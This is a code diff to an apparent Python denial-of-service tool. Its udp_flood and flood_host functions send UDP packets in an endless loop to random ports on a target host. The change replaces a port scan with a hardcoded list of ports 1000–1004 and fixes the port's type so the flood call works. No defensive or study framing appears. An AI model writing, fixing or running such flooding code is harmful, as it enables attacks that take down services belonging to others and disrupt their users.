@@ -9,7 +9,7 @@ from random import randint
 
 # Message is 1 byte
 MESSAGE = bytes(1)
-
+UDP_PORTS = ['1000', '1001', '1002', '1003', '1004']
 
 def udp_flood(host, port, amount):
     sock = socket.socket(socket.AF_INET,  # Internet
@@ -24,7 +24,7 @@ def udp_flood(host, port, amount):
 
 
 def flood_host(host, amount):
-    open_ports = search.scan_udp_ports(host)
+    open_ports = UDP_PORTS # search.scan_udp_ports(host)
     length = len(open_ports)
 
     if length == 0:
@@ -33,10 +33,9 @@ def flood_host(host, amount):
     while True:
         # Choose random port
         index = randint(0, length - 1)
-        print("Flooding port:", open_ports[index])
 
         # If amount is 0, floods the first random port only
         try:
-            udp_flood(host, open_ports[index], amount)
+            udp_flood(host, int(open_ports[index]), amount)
         except:
             print("Cannot flood port", open_ports[index])
